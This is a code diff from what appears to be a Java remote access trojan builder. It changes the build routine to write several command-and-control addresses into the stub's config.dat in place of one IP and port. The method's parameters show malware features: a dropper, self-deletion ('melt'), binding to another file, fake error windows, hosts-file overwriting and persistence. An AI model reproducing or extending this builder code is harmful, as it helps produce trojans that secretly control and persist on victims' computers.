@@ -44,7 +44,7 @@ public class Build {
 	}
 
 	@SuppressWarnings("resource")
-	public static void build(BuildListener listener, File buildFrom, File file, String ip, int port, String ID, String pass, EncryptionKey key, boolean dropper, String droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean hiddenFile, boolean bind, String bindpath, String bindname, String droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean debugmsg, OSConfig osconfig, boolean summary) {
+	public static void build(BuildListener listener, File buildFrom, File file, String[] addresses, String id, String pass, EncryptionKey key, boolean dropper, String droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean hiddenFile, boolean bind, String bindpath, String bindname, String droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean debugmsg, OSConfig osconfig, boolean summary) {
 		listener.start();
 
 		if (!file.getName().toLowerCase().endsWith(".jar")) {
@@ -83,15 +83,21 @@ public class Build {
 
 			listener.reportProgress(30, "Writing config", BuildStatus.INFO);
 
+			String addressString = "";
+			
+			for (String s : addresses) {
+				addressString += s + ",";
+			}
+			
+			
 			try {
 				entry = new ZipEntry("config.dat");
 				outputStub.putNextEntry(entry);
 
 				HashMap<String, Object> config = new HashMap<String, Object>();
 
-				config.put("ip", ip);
-				config.put("port", port);
-				config.put("id", ID);
+				config.put("addresses", addressString);
+				config.put("id", id);
 				config.put("pass", pass);
 				config.put("reconsec", reconSec);
 				config.put("name", name);
@@ -290,7 +296,7 @@ public class Build {
 
 			listener.done("Saved Server. Took " + (end - start) + " ms, size " + (file.length() / 1024L) + " kB");
 
-			FrameSummary frame = new FrameSummary(file, ip, port, pass, ID, listener.getStatuses());
+			FrameSummary frame = new FrameSummary(file, addressString, pass, id, listener.getStatuses());
 			frame.setVisible(true);
 		} catch (Exception ex) {
 			String message = ex.getMessage();
